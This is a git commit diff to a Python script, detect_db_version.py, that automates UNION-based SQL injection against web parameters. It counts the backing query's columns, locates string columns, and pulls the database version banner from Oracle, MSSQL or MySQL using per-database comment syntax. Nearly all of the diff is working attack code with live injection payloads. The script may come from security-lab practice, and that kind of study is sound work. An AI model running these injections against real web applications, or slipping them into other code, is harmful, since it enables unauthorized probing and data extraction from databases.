a4440af5a7b3a8799f70df19290146cbe202a06f
Kodoque <zakaria.addi@gmail.com>
2021-10-15 06:12:52 +0200

    Add MSSQL and MySql version detection

--- detect_db_version.py
+++ detect_db_version.py
@@ -9,10 +9,15 @@ def is_server_error(code):
     return str(code)[0] == '5'
 
 UNION_BASE= "' UNION SELECT NULL"
-def identify_table_size(url_endpoint, target_parameter):
+def identify_table_size(url_endpoint, target_parameter, db_type):
     counter=0
     while True:
-        params={ target_parameter : UNION_BASE + counter * ",NULL" + "--"}
+        if db_type == "Oracle":
+            params={ target_parameter : UNION_BASE + counter * ",NULL" + " FROM DUAL --"}
+        elif db_type == "MSSQL":
+            params={ target_parameter : UNION_BASE + counter * ",NULL" + "--"}
+        elif db_type == "MySql":
+            params={ target_parameter : UNION_BASE + counter * ",NULL" + "#"}
         resp = requests.get(url_endpoint, params=params)
         if not is_server_error(resp.status_code):
             break
@@ -22,12 +27,17 @@ def identify_table_size(url_endpoint, target_parameter):
         counter = counter + 1
     return counter + 1
 
-def identify_string_column(url_endpoint, target_parameter, table_size):
+def identify_string_column(url_endpoint, target_parameter, table_size, db_type):
     null_template=["NULL"] * table_size
     result=[]
     for i in range(table_size):
         query_string=",".join(null_template[0:i] + ["'a'"] + null_template[i+1:])
-        params={ target_parameter : "' UNION SELECT " + query_string + "--"}
+        if db_type == "Oracle":
+            params={ target_parameter : "' UNION SELECT " + query_string + " FROM DUAL--"}
+        elif db_type == "MSSQL":
+            params={ target_parameter : "' UNION SELECT " + query_string + "--"}
+        elif db_type =="MySql":
+            params={ target_parameter : "' UNION SELECT " + query_string + "#"}
         resp = requests.get(url_endpoint, params=params)
         if not is_server_error(resp.status_code):
             result+=[True]
@@ -51,11 +61,21 @@ def main():
         if test_vuln_parameter(url,p):
             tmp={"query_name":p}
             print("Parameter %s seems to be vulnerable, starting test" % p)
-            table_size = identify_table_size(url,p)
+            db_type = "Oracle"
+            table_size = identify_table_size(url,p,db_type)
+            if table_size == -1:
+                db_type = "MSSQL"
+                table_size = identify_table_size(url,p,db_type)
+            if table_size == -1:
+                db_type = "MySql"
+                table_size = identify_table_size(url,p,db_type)
+            if table_size == -1:
+                print("Unknown db type")
+                return
             tmp["table_size"] = table_size
             print("Backing table size seems to be %s" % str(table_size))
             tmp["positions"]=[]
-            for idx, r in enumerate(identify_string_column(url, p, table_size)):
+            for idx, r in enumerate(identify_string_column(url, p, table_size, db_type)):
                 if r:
                     print("position %s is a string" % str(idx))
                     tmp["positions"]+=[idx]
@@ -63,20 +83,51 @@ def main():
                     print("position %s is not a string" % str(idx))
             vulnerable_query_parameter+=[tmp]
 
+
     v = vulnerable_query_parameter[0]
-    select_columns=['NULL'] * v["table_size"]
-    select_columns[v["positions"][0]]="BANNER"
-    injection=" ' UNION SELECT {} FROM v$version#".format(",".join(select_columns)))
-    params={ v['query_name'] : injection}
-    resp = requests.get(url, params=params)
-    if not is_server_error(resp.status_code):
-            content = resp.text
-            for line in content:
-                if "BANNER" in line:
-                    print(line)
-        if counter > 50:
-            print("Limit reached")
-            return -1
+
+    if db_type == "Oracle":
+        print("Oracle Attempt")
+        select_columns=['NULL'] * v["table_size"]
+        select_columns[v["positions"][0]]="BANNER"
+        injection=" ' UNION SELECT {} FROM v$version--".format(",".join(select_columns))
+        params={ v['query_name'] : injection}
+        print(params)
+        resp = requests.get(url, params=params)
+        if not is_server_error(resp.status_code):
+                print(resp.text)
+        else:
+            print('Server error, no response')
+
+    elif db_type == "MSSQL":
+        print("MSSQL/MySql attempt")
+        select_columns=['NULL'] * v["table_size"]
+        select_columns[v["positions"][0]]="@@version"
+        injection=" ' UNION SELECT {}--".format(",".join(select_columns))
+        params={ v['query_name'] : injection}
+        print(params)
+        resp = requests.get(url, params=params)
+        if not is_server_error(resp.status_code):
+                print(resp.text)
+        else:
+            print('Server error, no response')
+
+    elif db_type == "MySql":
+        print("MSSQL/MySql attempt")
+        select_columns=['NULL'] * v["table_size"]
+        select_columns[v["positions"][0]]="@@version"
+        injection=" ' UNION SELECT {}#".format(",".join(select_columns))
+        params={ v['query_name'] : injection}
+        print(params)
+        resp = requests.get(url, params=params)
+        if not is_server_error(resp.status_code):
+                print(resp.text)
+        else:
+            print('Server error, no response')
+
+
+    
+
 
 
 if __name__ == "__main__":
